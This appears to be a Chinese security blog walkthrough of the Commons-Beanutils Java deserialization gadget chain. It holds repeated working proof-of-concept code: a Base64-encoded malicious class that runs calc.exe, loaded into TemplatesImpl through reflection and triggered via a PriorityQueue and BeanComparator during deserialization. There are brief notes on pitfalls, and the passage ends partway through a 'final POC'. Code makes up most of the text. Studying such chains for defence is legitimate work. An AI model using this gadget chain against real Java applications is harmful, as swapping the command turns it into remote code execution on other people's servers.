class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可成功弹出计算器。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051727342.png" alt="QQ截图20220305172653"></p><h2 id="添加上序列化"><a href="#添加上序列化" class="headerlink" title="添加上序列化"></a>添加上序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CbTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, NoSuchFieldException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> aClass1.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,templates);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">property</span> <span class="hljs-operator">=</span> aClass2.getDeclaredField(<span class="hljs-string">&quot;property&quot;</span>);<br>        property.setAccessible(<span class="hljs-literal">true</span>);<br>        property.set(beanComparator,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="注意点1"><a href="#注意点1" class="headerlink" title="注意点1"></a>注意点1</h2><p>这里相比与cc2来说，p神这里添加上了<strong>PriorityQueue priorityQueue &#x3D; new PriorityQueue(2,beanComparator);<strong>本人直接按照cc2的理解去走,后面跟进去看了看。才发现。当代码跟进到。</strong>PriorityQueue#siftUpUsingComparator</strong>这时候恍然大悟，我人都傻了，继续跟进他会直接跳转到<strong>BeanComparator#compare</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051819928.png" alt="QQ截图20220305173004"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051819921.png" alt="QQ截图20220305173013"></p><p>但是我们要成功弹出计算器，就必须是的<strong>property</strong>不为空，可以通过反射破局。<code>property=outputProperties</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">aClass2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">property</span> <span class="hljs-operator">=</span> aClass2.getDeclaredField(<span class="hljs-string">&quot;property&quot;</span>);<br>property.setAccessible(<span class="hljs-literal">true</span>);<br>property.set(beanComparator,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="注意点2"><a href="#注意点2" class="headerlink" title="注意点2"></a>注意点2</h2><p>上面的添加上反序列化仍然会报错的。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051818642.png" alt="image-20220305173956699"></p><p>所以p神才会构造成，<code>new Object[]&#123;templates,templates&#125;</code>，将这两个的值传入了<code>o1</code>和<code>o2</code></p><h2 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span 